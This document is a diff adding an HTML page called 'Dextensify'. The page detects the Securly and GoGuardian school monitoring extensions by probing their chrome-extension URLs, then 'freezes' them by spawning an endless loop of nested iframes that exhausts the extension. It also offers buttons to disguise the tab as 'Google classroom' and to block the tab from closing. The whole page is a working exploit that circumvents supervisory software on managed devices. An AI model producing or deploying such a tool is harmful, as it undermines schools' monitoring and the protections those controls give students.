@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang=en>
+<title>Dextensify</title>
+<style>
+    .tooltip {
+        position: relative;
+        display: inline-block;
+    }
+    .tooltip .tooltiptext {
+        visibility: hidden;
+        width: 120px;
+        background-color: black;
+        color: #fff;
+        text-align: center;
+        border-radius: 6px;
+        padding: 5px 0;
+        position: absolute;
+        z-index: 1;
+        bottom: 120%;
+        left: 50%;
+        margin-left: -60px;
+        opacity: 0;
+        transition: opacity 0.8s;
+        font-size: 12px;
+    }
+    .tooltip .tooltiptext::after {
+        content: "";
+        position: absolute;
+        top: 100%;
+        left: 50%;
+        margin-left: -15px;
+        border-width: 15px;
+        border-style: solid;
+        border-color: black transparent transparent transparent;
+    }
+    .tooltip:hover .tooltiptext {
+        visibility: visible;
+        opacity: 0.8;
+    }
+    details > summary {
+        color: #e2e2e2;
+        padding: 4px;
+        width: 200px;
+        background-color: #535353;
+        border: none;
+        box-shadow: 1px 1px 2px #bbbbbb;
+        cursor: pointer;
+    }
+
+    details > p {
+        color: #e2e2e2;
+        background-color: #535353;
+        padding: 4px;
+        margin: 0;
+        box-shadow: 1px 1px 2px #bbbbbb;
+    }
+</style>
+<meta charset=utf-8><meta content=width=device-width name=viewport><style>*{color:#d4d3da;font-family:sans-serif}a{color:#6daebd}a:hover{color:#4f9eb0}pre,code{background-color:#1e2324;padding:4px;font-family:monospace;overflow-x:auto}pre{padding:8px}pre code{background-color:#0000;border:none;padding:0}body{background-color:#1e2324;width:100%;height:100%;margin:0}button{background-color:#33626c;border:#0000;padding:6px 8px;font-size:15px;transition-duration:.5s;}button:hover{background-color:#33626c;border:#0000;padding:10px 12px;font-size:15px;transition-duration:.5s;}#main_div{object-fit:contain;background-color:#252b2d;max-width:800px;margin:16px auto;padding:4px 16px}#buttons_container{flex-wrap:wrap;gap:8px;display:flex}</style><script>var button_handler=(a=>{let b=!confirm(`LES GO!!`);if(b)return;setTimeout(()=>{create_iframes(a)},5000)});var detect_extensions=(async()=>{let a=[];for(let b of Object.values(extensions)){let c=await check_url(b.url);if(c){a.push(b)}};return a});var create_iframes=(a=>{let f=0,e=`iframe`;let b=[];let c=5;let d=a.url;while(!0){let a=document.createElement(e);document.body.append(a);b.push(a);for(let b=f;b<50;b++){let b=document.createElement(e);b.src=d;b.style.width=b.style.height=`1px`;a.contentDocument.body.append(b)};while(b.length>Math.max(3,10- c)){b[f].remove();b.shift()};c++}});var check_url=(async(a)=>{let b=new AbortController();let c=setTimeout(()=>b.abort(),500);try{await fetch(a,{signal:b.signal});return !0}catch(a){let b=a+ ``;return b.includes(`AbortError`)}});var main=(async()=>{let a=await detect_extensions();let b=from_id(`buttons_container`);if(a.length===0){b.innerHTML=`<p><b>Error: No supported extensions detected.</b></p>`;return}else{b.innerHTML=``};for(let c of a){let a=document.createElement(`button`);a.innerText=`Freeze ${c.name}`;a.onclick=()=>{button_handler(c)};b.append(a)}});let from_id=a=>document.getElementById(a);let extensions={"securly_new":{name:`Securly`,url:`chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css`},"securly_old":{name:`Securly (old)`,url:`chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css`},"goguardian":{name:`Goguardian`,url:`chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js`}};window.onload=main</script><body><div id=main_div><h1 style=margin-top:8px>Dextensify</h1><div>Drag <u>chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh</u> to the address bar</div><br><div id=buttons_container><p><i>Detecting extensions...</i></div><br><hr>
+<button onclick=cloak() class="tooltip">Cloak
+    <span class="tooltiptext">Sets this tab name to Google classroom.</span>
+</button>
+<button onclick=preventclose() class="tooltip">Prevent close
+    <span class="tooltiptext">Prevents this tab from being closed</span>
+</button> <br><br>
+<details>
+    <summary>Version log</summary>
+    <p>Added the version log</p>
+    <p>Added button tooltips</p>
+    <p>Added small instructions</p>
+    <p>Added some extra buttons for other things</p>
+    <p>Added transitions for the buttons</p>
+    <p>Changed some button styles</p>
+    <p>Optimized (deleted a lot of the instructions and removed other extensions)</p>
+</details>
+<div style=margin-bottom:8px>Optimized, upgraded, and styled version by <a href=https://github.com/Cowthecow94 target=_blank>Cowthecow94</a>.</div>
+<script>
+    function cloak() {
+        document.getElementsByTagName('title')[0].innerHTML = 'Google classroom'
+    }
+    function preventclose() {
+        onbeforeunload = (i) => 1
+    }
+</script>
